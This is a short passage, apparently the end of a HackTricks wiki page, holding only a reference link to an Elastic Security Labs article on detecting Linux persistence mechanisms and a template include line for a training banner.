- [36] [Elastic Security Labs — Linux Detection Engineering: persistence mechanisms](https://www.elastic.co/security-labs/threat-command/primer-on-persistence-mechanisms)
{{#include ../../banners/hacktricks-training.md}}
